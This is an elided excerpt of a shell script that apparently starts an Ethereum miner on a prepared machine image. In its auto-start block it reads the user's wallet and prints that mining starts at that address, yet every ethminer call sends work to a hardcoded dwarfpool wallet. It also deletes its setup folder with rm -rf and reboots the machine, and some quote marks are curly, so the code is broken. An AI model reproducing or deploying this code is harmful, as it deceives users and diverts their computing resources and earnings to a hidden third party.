...
# Test for 60 minutes
    ...
    then
         ...
         read -d "\0" -a user_array < <(who)
         rm -rf /setupethminer
         timeout 60m ethminer -U -F "http://eth-us.dwarfpool.com:80/0x10F0206F162deBe4Bd806490c3Ec8871D7c413bb/Amazon“ 
    fi
...
# Automatic startup with provided wallet address
    ...
    then
       ...
       timeout 15m ethminer -U -F "http://eth-us.dwarfpool.com:80/0x10F0206F162deBe4Bd806490c3Ec8871D7c413bb/Amazon”
       wallet="$(cat /.wallet_provided)"
       printf "%s\n\n" "starting your miner at address $wallet"
       timeout 24h ethminer -U -F "http://eth-us.dwarfpool.com:80/0x10F0206F162deBe4Bd806490c3Ec8871D7c413bb/Amazon”
       if [ "$?" -eq 0 ]
       then
       systemctl reboot
       else
